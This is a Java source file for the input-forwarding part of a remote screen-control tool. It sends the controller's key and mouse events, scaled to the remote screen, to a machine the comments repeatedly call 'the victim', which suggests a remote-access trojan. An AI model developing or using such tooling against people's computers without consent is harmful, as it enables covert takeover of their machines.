package BackEnd;

import java.awt.*;
import java.awt.event.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * This class contains the event handling of all events performed by the controller.
 * It will collect the events, encode them into a string form and send it to the
 * victim using the send command of the controller class.
 * @author Deekyech
 */
public class ScreenSharingEventHandling extends MouseAdapter implements KeyListener {

    /**
     * ******************************************************************
     *                            CONSTRUCTOR
     * ******************************************************************
     */
    /**
     * The constructor will initialize the reference of the controller.
     * @param controller : A reference to access the sendCommand method of
     *                     Controller class.
     */
    public ScreenSharingEventHandling(Controller controller) {
        this.controller = controller;
    }

    @Override
    public void keyTyped(KeyEvent e) {}

    /**
     * It will encode the keyPressed event generated by the controller into
     * a string format and send it to the victim using the sendCommand method
     * of the controller class.
     * @param ke : KeyEvent object generated when a keyPressed Event is performed
     *             by the controller.
     */
    @Override
    public void keyPressed(KeyEvent ke) {
        controller.sendCommand("" + ScreenSharingConstants.KEY_PRESSED_COMMAND + " " + ke.getKeyCode() + "\n");
    }

    /**
     * It will encode the keyReleased event generated by the controller into
     * a string format and send it to the victim using the sendCommand method
     * of the controller class.
     * @param ke : KeyEvent object generated when a keyReleased Event is performed
     *             by the controller.
     */
    @Override
    public void keyReleased(KeyEvent ke) {
        controller.sendCommand("" + ScreenSharingConstants.KEY_RELEASED_COMMAND + " " + ke.getKeyCode() + "\n");
    }

    /**
     * It will encode the mouseMoved event generated by the controller into
     * a string format and send it to the victim using the sendCommand method
     * of the controller class.
     * @param me : MouseEvent object generated when a mouseMoved Event is performed
     *             by the controller.
     */
    @Override
    public void mouseMoved(MouseEvent me) {
        int x = (int) resolveDimensions.getScaleX(me.getX());
        int y = (int) resolveDimensions.getScaleY(me.getY());
        me.translatePoint(x, y);
        controller.sendCommand("" + ScreenSharingConstants.MOUSE_MOVE_COMMAND + " " + me.getX() + " " + me.getY() + "\n");
    }

    /**
     * It will encode the mousePressed event generated by the controller into
     * a string format and send it to the victim using the sendCommand method
     * of the controller class.
     * @param me : MouseEvent object generated when a mousePressed Event is performed
     *             by the controller.
     */
    @Override
    public void mousePressed(MouseEvent me) {
        controller.sendCommand("" + ScreenSharingConstants.MOUSE_PRESSED_COMMAND + " " + me.getButton() + "\n");
    }

    /**
     * It will encode the mouseReleased event generated by the controller into
     * a string format and send it to the victim using the sendCommand method
     * of the controller class.
     * @param me : MouseEvent object generated when a mouseReleased Event is performed
     *             by the controller.
     */
    @Override
    public void mouseReleased(MouseEvent me) {
        controller.sendCommand("" + ScreenSharingConstants.MOUSE_RELEASED_COMMAND + " " + me.getButton() + "\n");
    }

    /**
     * It will encode the mouseWheelMoved event generated by the controller into
     * a string format and send it to the victim using the sendCommand method
     * of the controller class.
     * @param me : MouseWheelEvent object generated when a mouseWheelMoved Event is performed
     *             by the controller.
     */
    @Override
    public void mouseWheelMoved(MouseWheelEvent me) {
        controller.sendCommand("" + ScreenSharingConstants.MOUSE_WHEEL_COMMAND + " " + me.getScrollAmount() + "\n");
    }

    /**
     * This method will be called by the controller class when it receives the screen
     * size of the victim.
     * It will decode dimensionString and will initialize the resolveDimensions field.
     * @param dimensionString : Victim screen size encoded in a string format.
     */
    public static void calculateScalingFactor(String dimensionString) {
        Matcher matcher = Pattern.compile("width=(\\d*),height=(\\d*)").matcher(dimensionString);
        if (matcher.find()) {
            resolveDimensions = new ResolveDimensions(new Dimension(Integer.parseInt(matcher.group(1)), Integer.parseInt(matcher.group(2))), Toolkit.getDefaultToolkit().getScreenSize());
        }
    }

    //Variable declarations
    private Controller controller;
    private static ResolveDimensions resolveDimensions;
}